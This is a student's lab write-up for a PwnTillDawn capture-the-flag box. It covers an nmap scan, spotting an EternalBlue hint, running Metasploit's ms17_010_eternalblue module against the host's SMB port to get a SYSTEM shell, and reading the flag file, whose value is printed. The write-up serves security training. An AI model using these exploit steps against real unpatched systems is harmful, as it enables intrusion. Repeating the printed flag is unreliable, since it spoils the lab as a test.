<h3>LAB WEEK 3: PwnTillDawn 1st Box</h3>

1. open terminal and run `openvpn PwnTillDawn.ovpn`.
2. Scan the network in the range `10.150.150.10-254`.
3. Pick your desire ip address like `10.150.150.242`

RECON:
1. `nmap -F 10.150.150.242` to see available open ports.
2. common open port found:
   53 --> domain
   80 --> http
   445 --> micorosft-ds or smb


ENUMERATION:
1. There are port 80 that open so go to browser and type the ip 10.150.150.242
2. It will show this on the web
<img width="938" height="870" alt="image" src="https://github.com/user-attachments/assets/58dc4ba4-16ef-4ba8-a01b-391e729aeefe" />
3. check source code for anything suspicious
<img width="514" height="454" alt="image" src="https://github.com/user-attachments/assets/eef34a36-eb4c-48ce-b9d7-adbef8a7950e" />
4. found vulnerable code in image name Mr Blue aka MS17-010 which is EternalBlue


EXPLOITATION:
1. use metasploit to exploit port 445
2. run `msfconsole` to open metasploit console
3. run `use exploit/windows/smb/ms17_010_eternalblue` 
<img width="639" height="77" alt="image" src="https://github.com/user-attachments/assets/257446f8-902c-4d5e-b6bf-7a486765d190" />
4. then set your local host `set LHOST <your ip address>`
5. set victim host `set RHOST 10.150.150.242`
<img width="639" height="128" alt="image" src="https://github.com/user-attachments/assets/baebb5a3-707d-40ab-a98f-398af3528e39" />
6. then run
<img width="639" height="425" alt="image" src="https://github.com/user-attachments/assets/dd2b548f-2a75-4390-ac0c-1b95882bba15" />


PRIVILEGE:
1. run `getuid` to see who are you.
   - Server username: NT AUTHORITY\SYSTEM
2. run `sysinfo` to display the details.
   <img width="632" height="184" alt="Screenshot From 2026-04-09 01-58-04" src="https://github.com/user-attachments/assets/ff492e10-2c21-470d-b323-429abe02a37b" />


POST EXPLOITATION:
1. navigate to Admin folder: `cd C:\\Users\\Administrator.GNBUSCA-W054`
2. navigate to Desktop to find the flag: `cd ~/Dekstop`.
3. list all the file in Dekstop: `ls`.
4. found 1 file name FLAG34.txt.
5. open the file: `cat FLAG34.txt`

Found the flag !!!
flag: `c2e9e102e55d5697ed2f9a7ea63708c1cc411b79`

<img width="639" height="425" alt="image" src="https://github.com/user-attachments/assets/d81a483f-ba3e-4494-9a88-99485bdbe36b" />

<img width="653" height="231" alt="image" src="https://github.com/user-attachments/assets/62c7ce8e-467b-4a57-a32b-6171307e6b4e" />

<img width="653" height="73" alt="image" src="https://github.com/user-attachments/assets/979b4632-2372-4302-ab69-5346cfe5bace" />

